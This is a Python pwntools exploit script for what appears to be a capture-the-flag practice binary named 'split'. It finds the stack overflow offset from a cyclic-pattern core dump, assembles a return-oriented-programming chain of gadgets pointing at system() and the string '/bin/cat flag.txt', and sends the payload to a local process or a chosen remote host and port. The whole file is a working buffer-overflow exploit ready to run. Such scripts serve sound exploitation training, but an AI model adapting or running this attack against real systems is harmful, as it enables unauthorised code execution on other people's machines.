#!/bin/env python3

import argparse
import os
from pwn import *

PAD_INFOS = 20

# PARSING
parser = argparse.ArgumentParser(
	description="AK some binary"
)

parser.add_argument("-t", "--target",
	help="choose the binary to target",
	default="./bin/split",
	type=str,
	required=False
)

parser.add_argument("-r", "--remote",
	help="should run localy or remotly",
	default=False,
	type=bool,
	required=False
)

parser.add_argument("-g", "--gdb",
	help="should run gdb with pwn tool",
	action="store_true",
	required=False
)

args = parser.parse_args()

if args.remote:
	parser.add_argument("-H", "--host",
		help="host for the remote connection",
		type=str,
		required=True
	)

	parser.add_argument("-p", "--port",
		help="port for the remote connection",
		type=int,
		required=True
	)

args = parser.parse_args()

# MAIN UTILS
## write all log into a file
context.log_file = "ak.log"

## LOAD BINARY
ELF_LOADED = ELF(args.target)
ROP_LOADED = ROP(ELF_LOADED)

## Some thins may change between 64 and 32 bit
if ELF_LOADED.arch == "amd64":
	padding_movaps = 1
	offset_to_add = 0
	REG_BASE_PTR = "rbp"
	pack_function = p64
else:
	padding_movaps = 0
	offset_to_add = 4
	REG_BASE_PTR = "ebp"
	pack_function = p32

# if remote launch remote
if args.remote:
	PROC = remote(args.host, args.port)
# otherwise launch
else:
	PROC = ELF_LOADED.process()
	# attach gdb to process
	if args.gdb:
		gdb.attach(PROC.pid, """
			c
			""", api=True)

## usefull PTR
STR_PTR = next(ELF_LOADED.search(b'/bin/cat flag.txt'))
SYSTEM = ELF_LOADED.symbols['system']

## ROPZ
ROPZ = {}

ROPZ_LIST = {
	"ret":			["ret"],
	"pop_rdi":		["pop rdi"],
	"pop_rdi_ret":	["pop rdi", "ret"]
}

for key, value in ROPZ_LIST.items():
	try:
		tmp = {
			key: ROP_LOADED.find_gadget(value)[0]
		}
	except TypeError:
		log.warn(f"{key}: gadget are unavailable")
	else:
		ROPZ[key] = tmp[key]

if len(ROPZ) > 0:
	log.success("ROP gadget found :")

	for key, value in ROPZ.items():
		log.info(f"{key} : \x1b[{PAD_INFOS}G[{hex(value)}]")
else:
	log.warn("No ROP gadget found.")

def from_addr_to_str(addr):
	return (binascii.unhexlify(str(hex(addr))[2:]))

def pack_all(items):
	log.success("To pack :")
	for item in enumerate(items):
		log.info(str(hex(item[1])))
	return (b''.join([ pack_function(r) for r in items ]))

PROC_CYCLIC = ELF_LOADED.process()
PROC_CYCLIC.sendline(cyclic(128))
PROC_CYCLIC.wait_for_close()
CORE_DUMP = PROC_CYCLIC.corefile

log.warn("Removing core dump (" + CORE_DUMP.path + ")")
os.remove(CORE_DUMP.path)

OFFSET = cyclic_find(CORE_DUMP.registers[REG_BASE_PTR])
OFFSET += len(from_addr_to_str(CORE_DUMP.registers[REG_BASE_PTR]))

if OFFSET == -1:
	log.failed("offset not found.")
else:
	log.success("offset found : " + str(OFFSET))

log.success("Found some usefull symbols: ")
log.info(f"STR_PTR : \x1b[{PAD_INFOS}G[{hex(STR_PTR)}]")
log.info(f"SYSTEM : \x1b[{PAD_INFOS}G[{hex(SYSTEM)}]")

OFFSET = b'A' * OFFSET

if ELF_LOADED.arch == "amd64":
	PACKED = pack_all([ROPZ["ret"], ROPZ["pop_rdi"], STR_PTR, SYSTEM])
else:
	PACKED = pack_all([SYSTEM, ROPZ["ret"], STR_PTR])

log.success("Len packed: " + str(len(PACKED)))

PAYLOAD = OFFSET + PACKED

# log.success("Packed: " + PAYLOAD.decode('latin1') + "\n\n")
log.success("Packed payload: " + str(PAYLOAD) + "\n")

PROC.sendline(PAYLOAD)

# PROC.interactive()

PROC.clean_and_log()
